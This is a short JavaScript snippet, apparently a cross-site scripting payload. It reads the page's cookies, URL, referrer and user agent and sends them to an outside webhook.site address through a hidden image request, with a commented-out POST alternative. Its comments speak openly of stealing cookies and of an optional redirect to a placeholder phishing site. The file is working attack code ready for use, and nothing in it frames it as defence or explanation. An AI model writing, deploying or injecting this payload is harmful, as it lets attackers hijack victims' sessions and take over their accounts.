(function() {
    var cookies = document.cookie;
    var currentURL = window.location.href;
    var referrer = document.referrer;
    var userAgent = navigator.userAgent;

    // --- IMPORTANT: REPLACE THIS URL WITH YOUR WEBHOOK.SITE URL ---
    var webhookURL = 'https://webhook.site/db12b78f-6080-4c07-8792-5e1bc13e7fee'; // Example: https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890

    var logData = {
        cookies: cookies,
        url: currentURL,
        referrer: referrer,
        userAgent: userAgent
    };

    // Send data as a GET request (simpler for basic logging)
    new Image().src = webhookURL + '?c=' + encodeURIComponent(JSON.stringify(logData));

    // Optional: Send data as a POST request (more robust, but requires a backend to handle POST)
    /*
    var xhr = new XMLHttpRequest();
    xhr.open("POST", webhookURL, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(logData));
    */

    // Optional: Add a simple redirection after attempting to steal cookies
    // window.location.href = 'http://YOUR_PHISHING_SITE.COM';

})();
